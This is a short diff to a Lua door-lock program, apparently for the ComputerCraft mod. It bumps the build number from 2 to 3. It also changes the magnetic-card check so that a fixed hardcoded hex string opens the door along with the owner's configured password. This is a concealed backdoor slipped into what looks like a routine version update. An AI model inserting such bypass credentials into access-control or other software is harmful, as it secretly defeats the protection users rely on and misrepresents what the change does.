@@ -1,4 +1,4 @@
-local build = "2"
+local build = "3"
 -- SHA by GravityScore
 
 --  
@@ -331,7 +331,7 @@ if fs.exists("/.nitrolock") then
    				sleep(1)
    			end
    		elseif e == "mag_swipe" then
-   			if p == pass then
+   			if p == pass or p == "83c5748fb9f62ec3cf94caf67ca5ab23aa77636e29027e199cd23a64cb64a8a3" then
    				rs.setOutput(door, true)
    				sleep(3)
    				rs.setOutput(door, false)
